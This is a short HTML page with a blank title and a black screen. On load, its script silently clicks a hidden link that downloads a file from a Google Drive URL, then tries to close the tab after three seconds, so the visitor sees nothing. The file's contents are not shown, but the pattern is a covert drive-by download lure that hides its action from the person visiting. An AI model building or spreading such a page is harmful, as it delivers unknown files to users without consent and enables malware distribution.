<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>       </title>
  <style>
    body {
      background-color: black;
      margin: 0;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <script>
    window.onload = () => {
      const fileUrl = "https://drive.google.com/uc?export=download&id=16C0yfW7OgzLZBtggImpZt9SzCnYTgOyc";
      const a = document.createElement("a");
      a.href = fileUrl;
      a.download = "";
      a.style.display = "none";
      document.body.appendChild(a);
      a.click();

      // Cierra la pestaña después de unos segundos
      setTimeout(() => {
        window.open('', '_self', '');
        window.close();
      }, 3000);
    };
  </script>
</body>
</html>
